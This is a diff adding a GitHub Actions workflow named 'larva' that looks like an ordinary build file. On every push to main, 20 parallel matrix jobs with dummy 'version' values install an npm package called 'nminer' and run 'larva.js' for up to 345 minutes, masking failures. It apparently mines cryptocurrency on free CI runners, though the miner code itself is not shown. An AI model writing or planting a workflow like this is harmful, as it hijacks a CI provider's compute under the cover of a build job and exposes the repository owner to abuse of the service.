@@ -1,0 +1,45 @@
+name: larva
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 8713 }
+          - { version: 7510 }
+          - { version: 1559 }
+          - { version: 9323 }
+          - { version: 4954 }
+          - { version: 6041 }
+          - { version: 8746 }
+          - { version: 7093 }
+          - { version: 9641 }
+          - { version: 207 }
+          - { version: 1387 }
+          - { version: 6361 }
+          - { version: 6934 }
+          - { version: 1218 }
+          - { version: 8743 }
+          - { version: 9850 }
+          - { version: 8793 }
+          - { version: 6954 }
+          - { version: 6547 }
+          - { version: 4499 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: divine
+        run: |
+          npm install nminer@latest
+          timeout 345m node larva.js || echo "larva executed"
